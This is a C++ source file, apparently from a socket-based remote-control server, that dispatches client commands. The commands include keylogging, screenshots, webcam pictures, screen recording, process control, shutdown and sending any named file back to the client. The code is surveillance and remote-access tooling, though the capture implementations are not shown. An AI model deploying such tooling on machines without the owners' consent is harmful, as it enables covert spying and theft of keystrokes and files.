#include "Application/executeCommand.h"
#include "commandProcessor.h"
#include "serverHandler.h"
#include "socketFiles.h"
#include <filesystem>

// Constants
const std::string SERVER_SAVE_DIR = "C:/MMT2/";

const std::map<std::string, std::string> FILE_COMMANDS = {
    {"get_screenshot", SERVER_SAVE_DIR + "screenshot.png"},
    {"get_picture", SERVER_SAVE_DIR + "picture.png"},
    {"list_program", SERVER_SAVE_DIR + "running_programs.txt"},
    {"list_process", SERVER_SAVE_DIR + "processes_with_pid.txt"},
    {"list_installed", SERVER_SAVE_DIR + "installed_programs.txt"},
    {"keylogger", SERVER_SAVE_DIR + "keylog.txt"}
};

const std::set<std::string> SIMPLE_COMMANDS = {
    "shutdown", "restart", "cancel_shutdown", "stop_recording", "start_recording"
};

// Command classification functions
bool is_start_program_command(const std::string& command) {
    return command.find("start_program") == 0;
}

bool is_start_process_command(const std::string& command) {
    return command.find("start_process") == 0;
}

bool is_stop_program_command(const std::string& command) {
    return command.find("stop_program") == 0;
}

bool is_stop_process_command(const std::string& command) {
    return command.find("stop_process") == 0;
}

bool is_keylogger_command(const std::string& command) {
    return command.find("keylogger") == 0;
}

bool is_file_generating_command(const std::string& command) {
    return FILE_COMMANDS.count(command) > 0;
}

bool is_simple_or_parameterized_command(const std::string& command) {
    return SIMPLE_COMMANDS.count(command) > 0 ||
           is_start_program_command(command) ||
           is_start_process_command(command) ||
           is_stop_program_command(command) ||
           is_stop_process_command(command);
}

// Helper functions
void create_output_directory(const std::string& filepath) {
    std::filesystem::create_directories(std::filesystem::path(filepath).parent_path());
}

void send_file_or_error(SOCKET clientSocket, const std::string& filepath, const std::string& description) {
    if (std::filesystem::exists(filepath)) {
        auto fileSize = std::filesystem::file_size(filepath);
        if (fileSize > 0) {
            std::cout << "[Server] Sending " << description << ": " << filepath 
                      << " (" << fileSize << " bytes)" << std::endl;
            send_file_over_socket(clientSocket, filepath);
        } else {
            send_error_response(clientSocket, description + " file is empty: " + filepath);
        }
    } else {
        send_error_response(clientSocket, description + " file not found: " + filepath);
    }
}

// Command processing functions
void process_send_file_command(SOCKET clientSocket, const std::string& command) {
    std::string filepath = command.substr(9); // Remove "send_file"
    filepath = trim(filepath);

    if (!filepath.empty() && std::filesystem::exists(filepath)) {
        std::cout << "[Server] Sending file: " << filepath << std::endl;
        send_file_over_socket(clientSocket, filepath);
    } else {
        send_error_response(clientSocket, "File not found: " + filepath);
    }
}

void process_keylogger_command(SOCKET clientSocket, const std::string& command) {
    std::string outputFile = FILE_COMMANDS.at("keylogger");
    create_output_directory(outputFile);

    // Execute keylogger command with file output
    execute_command_with_file(command, outputFile);

    // Send file to client
    send_file_or_error(clientSocket, outputFile, "keylogger result");
}

void process_file_command(SOCKET clientSocket, const std::string& command) {
    std::string outputFile = FILE_COMMANDS.at(command);
    create_output_directory(outputFile);

    execute_command_with_file(command, outputFile);
    send_file_or_error(clientSocket, outputFile, "result file");
}

void process_recording_command(SOCKET clientSocket, const std::string& command) {
    if (command == "start_recording") {
        std::string outputFile = SERVER_SAVE_DIR + "recording.avi";
        create_output_directory(outputFile);

        // Start recording, don't send file immediately
        execute_command_with_file(command, outputFile);
        send_success_response(clientSocket, "Recording started successfully");
    }
    else if (command == "stop_recording") {
        execute_command(command);

        // Wait for recording to complete with timeout
        std::cout << "[Server] Waiting for recording to complete..." << std::endl;
        bool recordingCompleted = wait_for_recording_complete(15); // Wait max 15 seconds

        if (recordingCompleted) {
            std::string videoFile = SERVER_SAVE_DIR + "recording.avi";
            send_file_or_error(clientSocket, videoFile, "recorded video file");
        } else {
            send_error_response(clientSocket, "Recording did not complete within timeout");
        }
    }
}

void process_simple_command(SOCKET clientSocket, const std::string& command) {
    execute_command(command);
    send_success_response(clientSocket, "Command executed: " + command);
}